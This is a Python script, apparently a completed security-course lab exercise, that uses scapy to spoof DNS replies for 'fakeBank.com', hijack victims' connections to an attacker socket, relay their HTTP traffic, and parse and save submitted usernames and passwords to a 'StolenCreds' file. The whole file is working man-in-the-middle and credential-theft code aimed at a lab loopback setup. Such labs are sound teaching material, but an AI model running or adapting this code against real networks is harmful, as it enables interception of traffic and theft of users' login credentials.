import os
import argparse
import socket

from scapy.all import *

conf.L3socket = L3RawSocket
WEB_PORT = 8000
HOSTNAME = "fakeBank.com"

MAX_BUFFER = 50000


def resolveHostname(hostname):
  # IP address of HOSTNAME. Used to forward tcp connection.
  # Normally obtained via DNS lookup.
  return "127.1.1.1"


def log_credentials(username, password):
  # Write stolen credentials out to file
  # Do not change this
  with open("lib/StolenCreds.txt", "wb") as fd:
    fd.write("Stolen credentials: username="+username+" password="+password)


def check_credentials(client_data):
  # TODO: Take a block of client data and search for username/password credentials
  # If found, log the credentials to the system by calling log_credentials().
  USERNAME_TOKEN = "username="
  PASSWORD_TOKEN = "password="
  user_index = client_data.find(USERNAME_TOKEN)
  password_index = client_data.find(PASSWORD_TOKEN)
  if user_index > 0 and password_index > 0:
    user_end = client_data.find('&', user_index)
    username = client_data[user_index + len(USERNAME_TOKEN):user_end]
    password_end = client_data.find('\n', password_index)
    password = client_data[password_index +
                           len(PASSWORD_TOKEN):password_end - 1]
    log_credentials(username, password)


def handle_tcp_forwarding(client_socket, client_ip, hostname):
  # TODO: Continuously intercept new connections from the client
  # and initiate a connection with the host in order to forward data

  while True:

    # TODO: accept a new connection from the client on client_socket and
    # create a new socket to connect to the actual host associated with hostname
    client_conn, addr = client_socket.accept()

    host_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host_socket.connect((resolveHostname(hostname), WEB_PORT))

    # TODO: read data from client socket, check for credentials, and forward along to
    # host socket. Check for POST to '/post_logout' and exit after that request has completed.
    data = client_conn.recv(MAX_BUFFER)
    check_credentials(data)
    host_socket.send(data)
    resp = host_socket.recv(MAX_BUFFER)
    host_socket.close()
    client_conn.send(resp)
    if data.find('POST /post_logout') != -1:
      client_conn.close()
      exit()


def dns_callback(packet, extra_args):
  # TODO: Write callback function for handling DNS packets.
  # Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof
  if packet.haslayer(DNSQR) and HOSTNAME in packet[DNS].qd.qname:
    spoofed_packet = IP(dst=packet[IP].src, src=packet[IP].dst) /\
        UDP(dport=packet[UDP].sport, sport=packet[UDP].dport) /\
        DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
            an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10,
                     rdata=extra_args['source_ip']))
    send(spoofed_packet)
    handle_tcp_forwarding(extra_args['socket'], None, HOSTNAME)

  send(packet)


def sniff_and_spoof(source_ip):
  # TODO: Open a socket and bind it to the attacker's IP and WEB_PORT
  # This socket will be used to accept connections from victimized clients
  try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((source_ip, WEB_PORT))
    sock.listen(1)
  except Exception as e:
    print "Couldn't bind attacker IP: %s.%s. Error: %s" % (source_ip, WEB_PORT, e)
    exit()

  # TODO: sniff for DNS packets on the network. Make sure to pass source_ip
  # and the socket you created as extra callback arguments.
  # DNS is executed over port 53.
  sniff(iface="lo", prn=lambda packet: dns_callback(packet, {
        'socket': sock,
        'source_ip': source_ip}),
        filter="udp and port 53", store=0)


def main():
  parser = argparse.ArgumentParser(
      description='Attacker who spoofs dns packet and hijacks connection')
  parser.add_argument('--source_ip', nargs='?', const=1,
                      default="127.0.0.3", help='ip of the attacker')

  args = parser.parse_args()
  sniff_and_spoof(args.source_ip)


if __name__ == "__main__":
  # Change working directory to script's dir
  # Do not change this
  abspath = os.path.abspath(__file__)
  dname = os.path.dirname(abspath)
  os.chdir(dname)
  main()
